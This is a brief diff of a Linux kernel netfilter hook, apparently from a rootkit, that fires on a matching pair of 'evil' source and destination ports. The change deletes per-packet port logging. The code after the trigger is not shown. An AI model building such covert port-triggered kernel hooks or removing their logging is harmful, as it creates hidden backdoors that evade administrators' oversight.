@@ -32,8 +32,6 @@ static unsigned int nf_hook_muadDib(void *priv, struct sk_buff *skb, const struc
 	unsigned short srcport;
 	srcport = ntohs(tcph->source);
 	
-	printk(KERN_INFO "source port: %d", srcport);
-	printk(KERN_INFO "dest port: %d", dport);
 	if(dport == EVIL_DEST_PORT && srcport == EVIL_SRC_PORT){
 		#if DEBUGMSG == 1
 		printk(KERN_INFO "muaddib: evil is about to happen");
